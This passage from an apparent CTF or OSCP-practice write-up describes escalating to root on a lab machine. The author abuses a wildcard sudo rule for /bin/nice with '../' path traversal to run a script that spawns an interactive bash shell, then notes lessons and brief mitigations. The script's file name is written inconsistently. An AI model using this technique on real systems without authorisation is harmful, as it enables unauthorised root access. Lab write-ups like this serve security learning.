Luckily, this wasn’t hard to pull off. Ran sudo -l manually:

webadmin@serv:~$ sudo -l 
[sudo] password for webadmin: 
Matching Defaults entries for webadmin on serv:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on serv:
    (ALL : ALL) /bin/nice /notes/*

So bin bash?

echo "/bin/bash -i" > nahiwin.sh 
chmod +x nahiwin.sh
sudo /bin/nice /notes/../home/webadmin/naiwin.sh

Talk about luck with that one. But so far, it's very common to run a quick bash script to get in, and the machine is compromised.

Lessons learned with this one, any port could be a rabbit hole, to be honest. And with the CTF test, like the OSCP. You can lose a lot of time during the test. It’s worth exploring to try everything. And the nmap brute force script worked in this case. Could use Hydra? Probably, but you don’t know users, though, and that test is already for basic ones. So that was a huge plus, just took an extremely long time to run that.

Mitigation: simple. Make your passwords more complex and restrict access to the webadmin account. Can’t say much about the website because I switched to a different attack to try to access it, but I’m pretty sure that if I kept going, I might not have found anything.
